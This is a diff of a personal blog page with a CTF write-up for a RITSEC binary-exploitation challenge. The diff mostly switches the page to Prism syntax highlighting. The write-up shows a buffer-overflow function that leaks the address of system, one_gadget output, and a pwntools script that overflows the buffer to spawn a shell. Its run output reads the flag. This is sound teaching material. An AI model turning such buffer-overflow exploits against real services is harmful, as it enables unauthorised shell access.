@@ -15,6 +15,7 @@
 
     <!-- Theme CSS -->
     <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body class="theme-bg-light">
 
@@ -33,7 +34,7 @@
 
                 <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                 <ul class="social-list list-inline py-3 mx-auto">
-                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                 </ul><!--//social-list-->
@@ -71,41 +72,35 @@
 <p>Category: Binary Exploitation</p>
 <p>Comments:</p>
 <p>This is what happens to your baby when you want a pwner and a graph theorist. Do your part!!!</p>
-<pre><code>nc challenges1.ritsec.club 1339
-</code></pre>
-<h2 id="write-up">Write up:</h2>
+<pre><code class="language-text">nc challenges1.ritsec.club 1339</code></pre><h2 id="write-up">Write up:</h2>
 <p>Looking at the C source we can see that we need to answer some graph theory questions and then we get to the vulnerability:</p>
-<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
-<span style="color:Blue;">void</span> vuln() {
-    <span style="color:Blue;">char</span> buf[100];
+<pre><code class="language-c">void vuln() {
+    char buf[100];
 
-    printf(<span style="color:#A31515;">&quot;Here is your prize: %p\n&quot;</span>, system);
+    printf("Here is your prize: %p\n", system);
     fgets(buf, 400, stdin);
-}
-</pre></div>
-</div>
+}</code></pre>
 <p>This function prints out the address of system and then reads in data resulting in a buffer overflow.</p>
 <p>At this point my teammate made a quick script to do the graph theory problems which then let me check if we could get a segfault.</p>
 <p>This challenge provided a libc so I did not need to leak libc. I then used one_gadget to find potential jumps:</p>
-<pre><code>one_gadget libc.so.6  
+<pre><code class="language-text">one_gadget libc.so.6  
 
-0xe6c7e execve(&quot;/bin/sh&quot;, r15, r12)
+0xe6c7e execve("/bin/sh", r15, r12)
 constraints:
   [r15] == NULL || r15 == NULL
   [r12] == NULL || r12 == NULL
 
-0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)
+0xe6c81 execve("/bin/sh", r15, rdx)
 constraints:
   [r15] == NULL || r15 == NULL
   [rdx] == NULL || rdx == NULL
 
-0xe6c84 execve(&quot;/bin/sh&quot;, rsi, rdx)
+0xe6c84 execve("/bin/sh", rsi, rdx)
 constraints:
   [rsi] == NULL || rsi == NULL
-  [rdx] == NULL || rdx == NULL
-</code></pre>
+  [rdx] == NULL || rdx == NULL</code></pre>
 <p>Using gdb I found that 0xe6c81 was the call I wanted and that I would need 120 NOPs. I then created the following script:</p>
-<div class="lang-python editor-colors"># import pwntools
+<pre><code class="language-python"># import pwntools
 from pwn import *
 
 # open connection
@@ -185,10 +180,9 @@ nops = b'\x90'* 120
 conn.sendline(nops + p64(addy - sysCall + 0xe6c81))
 
 # open interactive mode
-conn.interactive()
-</div>
+conn.interactive()</code></pre>
 <p>When run I got the following:</p>
-<pre><code>[+] Opening connection to challenges1.ritsec.club on port 1339: Done
+<pre><code class="language-text">[+] Opening connection to challenges1.ritsec.club on port 1339: Done
 [*] '/home/kali/Downloads/libc.so.6'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -263,9 +257,7 @@ Now tell me if this baby is Eulerian? (Y/N)
 True
 [*] Switching to interactive mode
 $ cat flag.txt
-RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}
-</code></pre>
-
+RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}</code></pre>
         </article>
 
         <footer class="footer text-left py-2 theme-bg-dark">
@@ -278,5 +270,6 @@ RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}
     <!-- Javascript -->
     <script src="../../assets/js/popper.min.js"></script>
     <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
 </body>
 </html>
